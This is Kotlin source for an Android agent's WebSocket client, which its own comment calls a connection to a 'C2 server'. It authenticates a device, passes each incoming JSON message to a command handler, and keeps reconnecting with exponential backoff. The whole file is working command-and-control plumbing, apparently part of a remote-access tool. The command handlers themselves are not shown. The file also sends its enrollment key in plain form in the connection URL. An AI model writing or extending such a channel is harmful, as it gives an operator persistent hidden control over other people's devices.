package ai.bixtx.agent

import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

typealias CommandHandler = (type: String, payload: Map<String, Any?>) -> Unit

/**
 * WebSocket connection to the bixtx C2 server.
 * Uses OkHttp WebSocket (RFC 6455). Auto-reconnects with exponential backoff.
 */
class C2Socket(private val deviceId: String) {

    private val client = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)  // no read timeout on WebSocket
        .build()

    private var ws: WebSocket? = null
    @Volatile private var alive = false
    private var reconnectDelay = Config.RECONNECT_DELAY

    var onCommand:    CommandHandler? = null
    var onConnect:    (() -> Unit)?   = null
    var onDisconnect: (() -> Unit)?   = null

    private fun hmacSha256(key: String, data: String): String {
        val mac = javax.crypto.Mac.getInstance("HmacSHA256")
        mac.init(javax.crypto.spec.SecretKeySpec(key.toByteArray(Charsets.UTF_8), "HmacSHA256"))
        return mac.doFinal(data.toByteArray(Charsets.UTF_8)).joinToString("") { (it.toInt() and 0xFF).toString(16).padStart(2, '0') }
    }

    fun connect() {
        alive = true
        val token = hmacSha256(Config.ENROLL_KEY, deviceId)
        val url = "${Config.C2_WS_URL}?device=$deviceId&token=$token&enrollKey=${Config.ENROLL_KEY}"
        val request = Request.Builder()
            .url(url)
            .header("User-Agent", "bixtx-agent/${Config.AGENT_VERSION}")
            .header("X-Platform", Config.PLATFORM)
            .build()
        ws = client.newWebSocket(request, listener)
    }

    fun disconnect() {
        alive = false
        ws?.close(1000, "shutdown")
        ws = null
    }

    fun send(type: String, payload: Map<String, Any?> = emptyMap()) {
        val json = JSONObject(payload + mapOf("type" to type, "ts" to System.currentTimeMillis()))
        ws?.send(json.toString())
    }

    private val listener = object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            reconnectDelay = Config.RECONNECT_DELAY
            onConnect?.invoke()
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            try {
                val json = JSONObject(text)
                val type = json.getString("type")
                val payload = mutableMapOf<String, Any?>()
                json.keys().forEach { k ->
                    if (k != "type") payload[k] = json.get(k)
                }
                onCommand?.invoke(type, payload)
            } catch (_: Exception) { /* malformed — ignore */ }
        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            onDisconnect?.invoke()
            if (alive) scheduleReconnect()
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            if (alive) scheduleReconnect()
        }
    }

    private fun scheduleReconnect() {
        val delay = reconnectDelay
        reconnectDelay = minOf(delay * 2, Config.MAX_RECONNECT)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (alive) connect()
        }, delay)
    }
}
